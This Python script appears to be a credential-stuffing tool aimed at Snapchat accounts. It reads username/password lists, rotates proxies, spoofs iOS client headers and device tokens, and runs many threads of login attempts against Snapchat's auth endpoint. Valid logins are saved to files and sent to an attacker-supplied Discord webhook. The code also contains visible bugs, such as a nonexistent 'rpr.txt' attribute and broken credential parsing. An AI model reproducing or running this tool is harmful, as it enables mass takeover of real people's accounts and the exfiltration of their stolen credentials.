import requests,user_agent
import time,os,threading
import itertools
import pyfiglet,colorama
from os import path
import sys,os
fore=colorama.Fore
by = "cyber.reaper"
import random
hunt = 0
bad_proxy = 0
error = 0
two_factor_required = 0
ua = user_agent.generate_user_agent()
headers = {
'user-agent': ua
}
r = requests.session()
done = 1
logo = (requests.get('http://artii.herokuapp.com/make?text=CSnap').text)
print(logo)
print("Made BY @0VDX ...") 
urlwebhook = input("your discord bot:")
import string,uuid
uid = str(uuid.uuid4())
e = int(input("[+] Sleep +3(Sec) : "))
threads_number = int(input("Threads: "))
file = input("file name:")
ran = open(file, 'r')
if path.exists("proxy.txt"):
    proxyfile = open("proxy.txt", 'r').read().splitlines()
else:
    print("Pls Make proxy.txt file\n")
    input()
    exit()
def checking():
    global hunt,error,two_factor_required,bad_proxy
    while 1:
        proxy_dict = []
        for proxy in proxyfile:
            proxy_dict.append(proxy)
            pxx = str(random.choice(proxy_dict))
        try:
            proxx={
			'http': f'http://{pxx}',
			'https': f'http://{pxx}'}
            url = "https://gcp.api.snapchat.com/scauth/login"
            h={
        "X-Snapchat-Uuid": "1CAE11B6-4C48-4EA8-8AEE-63BF40B858EC",
    "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
    "User-Agent": "Snapchat/10.80.5.79 (iPhone9,3; iOS 14.4.1; gzip)",
    "Accept": "application/json",
    "X-Snapchat-Client-Auth-Token": "v8:5FB486D9ABEA447617C18B74E9C3E382:0918C98870F4B8E400F865F9729C0A6998EBE7A3329FF2E6BD6A6844C4B56FC4135CD11D5427B15D0C8959D0EAFE111534A7BD6F5F4B1C9CC3C22CBCDFB885B47F164ACDCB3636D9CCCB252107B4A836BF99425698A36F4E95CA8D3B1017BA69B782BAB1D629DB15C9DA57C2ED1F679CE741D4B0F38C83E733F755384D6A257CB00BB012E8D9865382DBB8E5BA064599CEFA2C59EA2CCB5956E1292A4B86743030E284B8B3C49324CC87B6DCA88E360149C6D06B53490003B0722BDB02567403663E557E9427C3F6A32D6B465A74C9948782EF956E724EA975E0700C8AC1C1F8378D0D1797CBB6B48282BC792B01BC6A3EBE5AE1A124A9E2E8DB9AAA540E03C020831CD771167725A618898322AD2C54E5BCA2F69EB81CFDA878126EE2EA25FC033AB793F68C275E0D36C2B10E3EEC3B581997F8EA7E5387DA77125014862279CCCDC055D7877D1D4CDB12C4",
    "Host": "gcp.api.snapchat.com"}
            user = ran.readline().split('\n')[0]
            password = ran.readline().split('\n')[1]
            d = "device_check_token=AgAAANPvhhuaz%2F1mEEEWevsRtdMEUNk0%2Bme89vLfv5ZingpyOOkgXXXyjPzYTzWmWSu%2BBYqcD47byirLZ%2B%2B3dJccpF99hWppT7G5xAuU%2By56WpSYsATk5aHhFiWRhhphuRzJwMGv0Yl%2B%2FXDSBUa%2BrnMHGJ1Mv7blI3pPRtq3hdPW6fVKSCpioEfkEEEkfVRzx3y9AClM9AcAAN6YIAIcDQga3CWYT8LNDXocz2Gcca2O3Tp24wW9jFTgqQfWOcFy0GZSDl%2B%2FPJF7Cr4xGHYB517e9RL0lhJ%2F2NI%2FN91NGZDdCXUqdVFB1cbW%2F9FEEsUxhs8wIsZFXQgDH53f26K7b%2Bpb0P3ERJTjqiGrbATwlO0B%2B9D1fkN%2BMqgf6Pwm1xa9hFJTtXl59BC8gMIv2q1Z2HeEkWrRduomNUtLJwBMNJG%2F7r64%2BdkrAISF420B4t5rUo%2F4R%2BKoYVp%2F8BImIwMdVhf6Gix7qTLNPUzWcSeMqVVzaC7jUZytCGXEXeEf7YqYtr1bRJ6rJs5F87WeWnxJAtrkrTTztusMRxI0MXg8mbUOfoqcO63BSn4nYqedGDzKL5lGHABtYsDruDwrBqwxmLYWT7UuWxg7dW464F4r48hiZMivJ50n24z7jdt5i%2Bvvat4rdh%2FwCobhRFZzeXI2ZAS1d7Az4%2BDFwO1mSsIlYE3KESlfEGGzXj8%2FTy9zFE8KRoPdgoCH1KcZZ6brSB3QfiVJV5cpTa9hwPqOe9AI6k5UNV7aqZ5xMlVTxyha0c4YTD%2FAe7iSjtc1rYBp9iIU7ZV0c95BzK4xakxk9eq3KfJB72lQ2D9khYxcApzOeOgNoxLj4S2JkJiL%2FnaRJUmn7rRZGgFNSbT%2FVck44AyFpZl4XCSPSsc6mA7Wi4tB2NHFu8En5Wv7iO1RxPKwqPwhaqezOGNp0%2FKdd9RrikYOsLgVmlYUH7g1rO6aqbnOsDptJqbdcXaj2jtLyDbxFdgP8V49uXPo2Dgq2u%2BrWeUSDwN8A1JhQuaZUZBTmn%2BJ%2FjwQ0iyq6Sy8c10bbynHSubJpuD4xus%2BAbSaWdCoRA25xt%2Bz6aEQg5upw3sJvHQEGPWo%2BMmIZDyVfl%2BmKejLkro%2BtGPye5VaOJAo8ycgPsGU4VrVVDmhlRp2kI%2BmzI01DVLRc0l0EDC0abGymWjaq9E3ri4taX%2FNzM0QTmyvWV0AQCbMqWEzGKIIJOkn5MeE89MxX0jRVyy9LUjtQKyrJpf6flHD95kfTk06VFNtAVDxMRKW4CyNHtTxEPx75ac2mntaWFmH%2BGwR3F5sztWrOuYu%2B0q%2BGtkbJDfcGl6utTcyOh9SruTM6raBSz35qyOYpskctY5VUth4ZbKE53oHKBusn%2BEHkLRl7RzFjnToHDxfZmmBQNFP9trg3xf4qoE71li3nsO5nUaU93C8HWyFXyC9rf0umJivFqqR8YZeJ3FkLNk4UTXlgP%2FgJ1FgvQcNi0JSrPfiH84%2BaxLT%2BfwcDvOy8m7rWWKe060e3VVAUU62dRSzCyiLac6iItfRpsaV1Ovpd8uiRODTYLhHAWSwukj3GymbymfiPXW1Rl1UDq1HzCpX201aE9b5ZpY9ehhIDRZGXjRCcegJqzpiKRt5z9kHBkj2T%2Fa0MR%2FoeWdPnKdBSvrQBQ6iFce7oPYdoOP5m09IcZ1NFIEgnuyYRG0fDUKefEzwe%2BV3%2BW%2FEWVRB4xXeyiWQ0rWEP75%2FkCj0HxGvX%2BGSUX%2FEXB0ZFpLwMvyNP7VJrojDhOoG1o0PprQaqXRjiC8eo30S9xs6eN3mXqUTkVr0sE%2FDDfT6Ed7H3gJnK%2Fo4EQnKAebW0ns0aeYSyT%2FyhsPi1yieIUURlTp8M9win8PBStYokTH8ibWzsOztHsz1gJVhIFyy9MsaYjHsCz88wEcCdlO35ja1koAQJ7%2BS30D5Ey%2FNukBnD2NdqNMrFT69u3I8PdjAENrI%2BS%2FJcbotC%2B5mSsQwd%2BPXOQaEHnCTYvKHeqLH6S8VFLMMlNmb7bV%2FbUxn5KKhxA76sXw%2BIrIS8MkwKWWnqxD4CdRuqIwGmgdxzCEG7OVZIB9q8aRas6zvovE2XM3ho%2FUlAOHQtj%2FIRYIvcvjdyfE97ItSXazwX5ryWFhVUGeCC2Q9qjA2J1cv%2BeiTcXkK%2BIqN0Rm3%2B780SAu0%2FkqOy8TnQrGtVEZ%2B9xYfvtmfyKhLJshmkXjH12qFpa74QyQPoCIBrx%2FCsK7loN9MJO%2BwNyArOSLRYbLj5pISF75f5uz9bZwEGTHQXaoqonHTwwrX7Zheg%2Buzig4R9bsjMP8r1ztG5JvveDxHKJCfDcQFt0PY7oXPxc%2BauQL3ojLrc%2BSmWWEa9r9s9VEJkACt0E9zwYqNbZHH3448IwFterJpGPMjaqU%2Bt2v8sS0Sv3vg3aHDaVtUn6hOWWKLms0%2FgR1OpIwyq6o7Mjs0cOL88HnzHCAwMGnUCum4WNjUZYfFSFLcmN2rhYLYitrOvln55igXEUWLg6fqahZR4U1EYLDO2guZ1AvjVBxJUwi2OSTXXxu3FGbvUZ4EPHpurxZ4MVAknXCHKqv2Tpt3xNE6ZlR93plDWw%2FPa7uY79O2luYYbioT16YU5cJCP3Ayb3SmKFrZmrse7ComLkYHuLTKuPbH7tUjl5mwfdcHeHN9kVgBAstVs65xP9jqW7%2BOl8g0KW%2BcIOKnYt07xfTCrzb2sVC3S%2F2qTKKOJVR7kYzzEW4BBQD%2B1D8H8o2J0Mueq6e2q0HYWvfgvTPWF5pQb6AFWv3XiFkuHGiQfe9r3R71IEfk6914NcgskSP3RoHZjfTZ1n%2B6Fmys3VZpjRToKQ2w5XwETk4ZDNmkOaR6cNtMFnSlzu1VPahfXR52hNK3LfYoB%2FnZbo%2BEQ4JfG%2BQhvrqqfg8U8KcDDtunJ0cBjXw4Do52kWNdDRWpw56ihS6l&device_id=565264&dsig=1A77189FED6FD8FA1A7D&dtoken1i=00001%3AicHkqkCrQROlzS8NZFzRxGk8Zv%2B6oIgy%2BVJ69ZoT84prkSuT4d4qDKhwNp9OcOXS&fidelius_client_init=%7B%22new_fidelius_version%22%3A9%2C%22hashed_out_betas%22%3A[%22S30kOL6Zt8hUeys3KHu9gMzV%2B1xyss3aTkDqOZJBYvE%3D%22%2C%22QEpHHGn5HQAg9MKh%2FpirjbXGE8moCsZnOpPkBaDiwK0%3D%22%2C%22CmqrfIFS12o1Dpn7DIR2cF2nDw%2BJ7aF4tqIGQpF1BXM%3D%22%2C%220slHDLwDATo8pDeZOrOL6u%2BfaQkXVtNwAc7C95ZKS8s%3D%22]%2C%22new_hashed_out_beta%22%3A%22S30kOL6Zt8hUeys3KHu9gMzV%2B1xyss3aTkDqOZJBYvE%3D%22%2C%22new_iwek%22%3A%22RzF3PcHMBWuWhhaCi8binQu70PGFjui3GS4HGJPY3Ww%3D%22%2C%22new_out_beta%22%3A%22MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE9p8mnnKhEEXMd6mSF1aUsOscVh%2FAM726Nyv4PDJJkTOx1notTouLmdQHJ6Gh5YTTr78pR1P0f%2BwBrKZZL1oXqw%3D%3D%22%7D&from_deeplink=false&height=1334&odlv_pre_auth_token=&password="+password+"&pre_auth_token=&reactivation_confirmed=ho-12x&remember_device=true&req_token=930758537301f9b86e429de7fda39304d0ee4d8d19739a8629b49214d8c51a2b&screen_height_in=0&screen_height_px=667&screen_width_in=0&screen_width_px=375&timestamp=1624302815711&username="+user+"&width=750"
            rpr=r.post(url,data=d, headers=h, proxies=proxx)
            res = rpr.txt
            if ("updates_response") in res:
                hunt += 1
                print(f"\rhunt : {hunt} :two_factor_required {two_factor_required}:bad : {error} : bad_pro : {bad_proxy}" , end="")
                data1 = {
            "content" : f"hunt~ user: {user} pass: {password} by: {by}",
            "username" : "reaper"
            }
                result = requests.post(urlwebhook, json = data1)
                with open('good.txt', 'a') as writ:
                    writ.write(f'{user}:{password}\n')
                    time.sleep(e)
            elif ('logged') in res:
                error += 1
                print(f"\rhunt : {hunt} :two_factor_required {two_factor_required}:bad : {error} : bad_pro : {bad_proxy}" , end="")
                with open('bad.txt', 'a') as writ:
                    writ.write(f'{user}:{password}\n')
                    time.sleep(e)
            elif ('two_fa_needed') in res:
            	two_factor_required += 1
            	print(f"\rhunt : {hunt} :two_factor_required {two_factor_required}:bad : {error} : bad_pro : {bad_proxy}" , end="")
            	with open('twofac.txt', 'a') as writ:
            	       writ.write(f'{user}:{password}\n')
            	       time.sleep(e)
        except:
            bad_proxy += 1
            print(f"\rhunt : {hunt} :two_factor_required {two_factor_required}:bad : {error} : bad_pro : {bad_proxy}" , end="")
threads = []
for i in range(threads_number + 1):
    t = threading.Thread(target=checking)
    t.start()
    threads.append(t)
for i in threads:
    i.join()